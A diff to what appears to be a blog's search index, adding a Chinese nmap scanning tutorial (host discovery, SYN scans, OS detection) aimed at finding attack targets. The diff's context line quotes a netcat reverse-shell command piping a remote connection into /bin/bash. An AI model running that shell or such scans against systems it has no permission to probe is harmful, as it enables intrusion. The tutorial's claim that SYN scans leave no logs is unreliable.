@@ -96,16 +96,58 @@ kali：nc 192.168.0.107 4444 | /bin/bash | nc 192.168.0.107 4445
       </tags>
   </entry>
   <entry>
-    <title>nmap使用指南</title>
+    <title>nmap使用教程</title>
     <url>/2023/04/06/nmap-shi-yong-zhi-nan/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="你好，我就是测试"><a href="#你好，我就是测试" class="headerlink" title="你好，我就是测试"></a>你好，我就是测试</h2><h3 id="吃了吗？"><a href="#吃了吗？" class="headerlink" title="吃了吗？"></a>吃了吗？</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"你好"</span><span class="token punctuation">)</span>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Nmap-简介"><a href="#Nmap-简介" class="headerlink" title="Nmap 简介"></a>Nmap 简介</h2><p>nmap 是一个开源、免费的网络探测工具，适用于&#96;windows、linux、mac 等多种操作系统。能够快速扫描大型网络或者单个主机，可以发现网络上有哪些主机，这些主机提供什么服务，服务运行在什么操作系统（包括版本系统），扩大攻击范围。</p>
+<ul>
+<li>识别目标网络内活跃主机</li>
+<li>扫描主机端口</li>
+<li>探测主机的操作系统</li>
+<li>利用自带脚本检测漏洞</li>
+</ul>
+<h2 id="基本快速扫描"><a href="#基本快速扫描" class="headerlink" title="基本快速扫描"></a>基本快速扫描</h2><pre class=" language-shell"><code class="language-shell">nmap 172.20.10.2
 </code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306040958659.png"></p>
+<h2 id="快速扫描多个目标"><a href="#快速扫描多个目标" class="headerlink" title="快速扫描多个目标"></a>快速扫描多个目标</h2><pre class=" language-shell"><code class="language-shell">nmap  14.215.177.39 172.20.10.2
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306041005514.png"></p>
+<h2 id="详细描述输出扫描"><a href="#详细描述输出扫描" class="headerlink" title="详细描述输出扫描"></a>详细描述输出扫描</h2><pre class=" language-shell"><code class="language-shell">nmap -vv 14.215.177.39
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306041009486.png"></p>
+<h2 id="指定端口和范围扫描"><a href="#指定端口和范围扫描" class="headerlink" title="指定端口和范围扫描"></a>指定端口和范围扫描</h2><pre class=" language-shell"><code class="language-shell">namp -p 3389,20-200 192.168.227.133
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306041013726.png"></p>
+<h2 id="扫描除所有子网主机"><a href="#扫描除所有子网主机" class="headerlink" title="扫描除所有子网主机"></a>扫描除所有子网主机</h2><pre class=" language-shell"><code class="language-shell">nmap 192.168.227.1/24 
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306041021800.png"></p>
+<h2 id="显示扫描的所有主机的列表"><a href="#显示扫描的所有主机的列表" class="headerlink" title="显示扫描的所有主机的列表"></a>显示扫描的所有主机的列表</h2><pre class=" language-shell"><code class="language-shell">nmap -sL 192.168.227.1/24
+</code></pre>
+<h2 id="sP-ping-扫描"><a href="#sP-ping-扫描" class="headerlink" title="sP ping 扫描"></a>sP ping 扫描</h2><pre class=" language-shell"><code class="language-shell">nmap -sP 192.168.227.1-255
+</code></pre>
+<p>我们会用这个命令去扫描内网的一个ip范围，用来做内网的主机发现。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306041136754.png"></p>
+<h2 id="sS-SYN半开放扫描"><a href="#sS-SYN半开放扫描" class="headerlink" title="sS SYN半开放扫描"></a>sS SYN半开放扫描</h2><pre class=" language-shell"><code class="language-shell">nmap -sS 192.168.227.1 
+</code></pre>
+<p>因为这种技术使得Nmap不需要通过完整的握手，就能获得远程主机的信息。Nmap发送SYN包到远程主机，但是它不会产生任何会话.因此不会在目标主机上产生任何日志记录,因为没有形成会话。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306041149707.png"></p>
+<h2 id="sT-TCP扫描"><a href="#sT-TCP扫描" class="headerlink" title="sT TCP扫描"></a>sT TCP扫描</h2><pre class=" language-shell"><code class="language-shell">nmap -sT 192.168.227.133
+</code></pre>
+<p>只适用于找出TCP和UDP端口。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306041153400.png"></p>
+<h2 id="O-OS操作系统类型的探测"><a href="#O-OS操作系统类型的探测" class="headerlink" title="O OS操作系统类型的探测"></a>O OS操作系统类型的探测</h2><pre class=" language-shell"><code class="language-shell">nmap -O 192.168.227.133
+</code></pre>
+<p>用来了解远程主机的操作系统和软件是非常有用的，通过获取的信息你可以知道已知的漏洞。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/20200619085402268.png"></p>
+<h2 id="osscan-guess-猜测匹配操作系统"><a href="#osscan-guess-猜测匹配操作系统" class="headerlink" title="osscan-guess 猜测匹配操作系统"></a>osscan-guess 猜测匹配操作系统</h2><pre class=" language-shell"><code class="language-shell">nmap -O --osscan-guess 192.168.227.133
+</code></pre>
+<p>猜测认为最接近目标的匹配操作系统类型.</p>
+<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1685856242/zhngqi_nxbdsh.png"></p>
 ]]></content>
       <categories>
-        <category>渗透系统</category>
+        <category>黑客工具</category>
       </categories>
       <tags>
-        <tag>渗透工具</tag>
+        <tag>nmap</tag>
       </tags>
   </entry>
   <entry>
